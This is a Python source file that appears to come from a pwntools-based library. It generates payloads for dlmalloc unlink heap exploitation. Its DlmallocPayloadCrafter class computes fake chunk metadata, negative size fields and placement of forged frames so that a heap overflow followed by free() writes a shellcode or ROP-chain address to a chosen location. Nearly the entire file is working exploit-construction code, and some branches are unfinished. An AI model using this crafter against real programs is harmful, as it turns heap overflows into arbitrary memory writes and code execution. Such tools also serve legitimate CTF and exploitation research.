
from pwn import *

class HeaplibException(Exception):
    pass

class DlmallocPayloadCrafter(object):
    """
    Class that assists with generating payloads for Dlmalloc exploitation.

    "C" refers to the chunk whose metadata is overwritten with user input
    and is subsequently freed.

    "AFTER_C" refers to the chunk that free() thinks is the chunk after "C".
    free() finds AFTER_C as "C + SIZE_C".

    "BEFORE_C" refers to the chunk that free() thinks is the chunk before "C".
    free() finds BEFORE_C as "C - PREV_SIZE_C".

    The class returns 3 values :
        - prev       :   The string to be placed before the metadata of "C".
        - metadata   :   A 2-tuple value that will be used to overwrite the
                         metadata of "C".
        - post       :   The string to be placed after the metadta of "C".
    """

    def __init__(self, destination, source, **kw):
        """
        destination    :   Address to which `source` must be written out to.

        source         :   Address of your shellcode/ROP chain. Note that *(source+8)
                           must be writable.

        pre_length     :   Length of the string, after which you can overflow into the
                           metadata of "C".

        post_length    :   Amount of space you have available after the metadata of "C".

        pre_preset     :   Preset values that you need at certain offsets in the `prev`
                           string that will be generated and returned by `generate_payload`.

        post_preset    :   Preset values that you need at certain offsets in the `post`
                           string that will be generated and returned by `generate_payload`.
        """
        self.destination          = destination
        self.source               = source
        self.destination_2        = kw.get("destination_2", None)
        self.source_2             = kw.get("source_2", None)
        self.no_back_consol       = kw.get("no_back_consol", False)
        self.pre_length           = kw.get("pre_length", None)
        self.post_length          = kw.get("post_length", None)
        self.pre_preset           = kw.get("pre_preset", {})
        self.post_preset          = kw.get("post_preset", {})
        self.populating_character = kw.get("populating_character", "*")
        self.size                 = kw.get("size", context.bits/8)
        self.positioning          = kw.get("positioning", {"AFTER_C" : "prev",
                                                           "BEFORE_C": "post"})
        self.allow_null_bytes     = kw.get("allow_null_bytes", False)
        self.no_fwd_consol        = False
        if not self.destination_2 and not self.source_2:
            self.no_fwd_consol        = True

    def can_use(self, content, start, length):
        """
        Given a segment of an array described as `content[start: start+length]` determine
        if the segment can be used to place crafted frames, or not(as they may contain
        preset values).
        """
        return content[start: start+length] == [self.populating_character] * length

    def populate_content(self, **kw):
        """
        Given a `length`, and a set of `presets` values, create a list of size `length`,
        apply the presets, and return the list.
        """
        presets = kw.get("presets", None)
        length = kw.get("length", None)

        if not length:
            raise HeaplibException("Incorrect `length` value specified.")

        full_content = [self.populating_character] * length
        for offset in presets:
            content = presets[offset]
            start, end = offset, offset + len(content)

            if start < 0 and start >= length:
                raise HeaplibException("Invalid start offset when populating content")
            elif end > length:
                raise HeaplibException("Invalid end offset(%d) when populating content."\
                                       "Length=%d" % (end, length))

            if not self.can_use(full_content, start, len(content)):
                raise HeaplibException("Offset (%d: %d) is already used"
                                       %(start, start+len(content)))

            full_content[start:end] = content

        return full_content

    def find_usable_offset(self, i, full_list, unit_len, values_list, total_length,
                           backward=True):
        """
        A helper function that finds the a contiguous segment in `full_list` that can be
        used to place fake frames.

        Arguments:
            i               : start index to check from
            full_list       : the list to examine values of
            unit_len        : the length of the segment to be checked if free
            values_list     : the values to place in a segment if found to be free
            total_length    : length of the full_list
            backward        : indicates if this operation is performed for prev or post
        """
        while True:
            # Extract a segment from the full list
            segment = full_list[i: i+unit_len]

            # If the segment is not long enough do the following
            if len(segment) != unit_len:
                # If backward consolidation does not work out, we attempt forward
                # consolidation
                if backward:
                    log.info("Backward consolidation not possible. Attempting "\
                             "Forward consolidation. Segment length=%d unit_len=%d"\
                             %(len(segment), unit_len))
                    self.only_fwd_consol = True
                    self.no_back_consol = True
                    return None
                # If forward consolidation does not work out, we are unable to craft
                # a usable payload
                else:
                    message = "Not enough space when performing forward consolidation.\n"\
                              "Segment length=%d unit_len=%d" % (len(segment), unit_len)
                    raise HeaplibException(message)

            # If we have a segment, we check if its actually usable. If so, bingo!
            elif self.can_use(segment, 0, len(segment)):
                contents = flat(values_list)
                full_list[i:i+unit_len] = list(contents)
                assert len(full_list) == total_length
                return i

            # Else, we try the same process from a different offset
            if backward: i += 1
            else: i -= 2


    def generate_payload(self):
        """
        Generate the payload that will be used to perform arbitrary memory
        writes during unlink.

        This method returns 3 values.
        - prev      :  a list of values of length `self.prev_length` that can be used
                       to get to the metadata of "C".
        - metadata  :  a tuple with two values that are used to overwrite the PREV_SIZE
                       and the size field of "C".
        - post      :  a list of values of length `self.post_length` that can be placed
                       after "C".

        Currently, the library assumes that null bytes cannot be used in the payload.
        As null bytes cannot be used in the payload, PREV_SIZE_C and SIZE_C will need to be
        set to small negative values. As a result, AFTER_C will be present in `prev`
        and BEFORE_C will be present in `post`.
        """

        prev = self.populate_content(presets=self.pre_preset,  length=self.pre_length)
        post = self.populate_content(presets=self.post_preset, length=self.post_length)

        PREV_SIZE_C, SIZE_C = None, None

        # First we position and place "BEFORE_C"
        if self.positioning["BEFORE_C"] == "post":
            if self.no_back_consol:
                pass
            else:
                # If this step fails, set no_fwd_consol to False
                i, unit_len = 0, self.size*4

                # -16 and -15 are random values for the BEFORE_C's PREV_SIZE and SIZE
                values_list = [-16, -15, self.destination-12, self.source]
                PREV_SIZE_C = self.find_usable_offset(i, post, unit_len, values_list, self.post_length)
                if PREV_SIZE_C == None: PREV_SIZE_C = -1
                else: PREV_SIZE_C = -(PREV_SIZE_C + (self.size*2))

        elif self.positioning["BEFORE_C"] == "prev":
            if not self.allow_null_bytes:
                raise HeaplibException("Cannot place BEFORE_C in prev without allowing"\
                                       "null-bytes in PREV_SIZE")
            if self.no_back_consol:
                pass
            else:
                pass

        # Next we try to place "AFTER_C"
        if self.positioning["AFTER_C"] == "prev":
            if self.no_fwd_consol:
                # Find a contiguous chunk towards the end of `prev` that can be
                # used to place
                # i == 8 as we don't want MMAP flag to trigger
                i, unit_len = len(prev)-8, self.size*3
                i -= unit_len
                # Lets see if the payload size can be reduced, as we don't really need
                # forward consolidation.
                if prev[-self.size*2:] == [self.populating_character]*self.size*2 and PREV_SIZE_C == -4:
                    SIZE_C = -self.size
                    after_c = flat(-1, -1) # this value is not used
                    prev[-self.size*2:] = list(after_c)
                else:
                    if (i % 2) != 0: i -= 1
                    values_list = [-1, -1, -3]
                    SIZE_C = self.find_usable_offset(i, prev, unit_len, values_list, self.pre_length, backward=False)
                    SIZE_C = SIZE_C + 4
                    SIZE_C = -(len(prev) - SIZE_C)
                if self.no_back_consol:
                    SIZE_C |= 1
                else:
                    SIZE_C &= (-2)   # fffffffe or its equivalent based on arch
            else:
                raise HeaplibException("Forward consolidation not supported yet.")
        elif self.positioning["AFTER_C"] == "post":
            if not self.allow_null_bytes:
                raise HeaplibException("Cannot place AFTER_C in post without allowing"\
                                       "null-bytes in SIZE")
            if self.no_fwd_consol:
                pass
            else:
                pass

        log.debug("-=================================]")
        log.debug("prev length = %d" % len(prev))
        log.debug("post length = %d" % len(post))
        log.debug("PREV_SIZE_C = %s   %d" % (hex(PREV_SIZE_C & 0xffffffff), PREV_SIZE_C))
        log.debug("SIZE_C      = %s   %d" % (hex(SIZE_C & 0xffffffff), SIZE_C))
        log.debug("-=================================]")
        log.debug("prev          = %s" % repr(prev))
        log.debug("post          = %s" % repr(post))
        log.debug("-=================================]")

        return prev, (PREV_SIZE_C, SIZE_C), post

allocators = {"dlmalloc": DlmallocPayloadCrafter}

class HeapPayloadCrafter(object):
    def __init__(self, allocator, *args, **kwargs):
        self.payload_crafter = allocators[allocator](*args, **kwargs)

    def generate_payload(self):
        return self.payload_crafter.generate_payload()


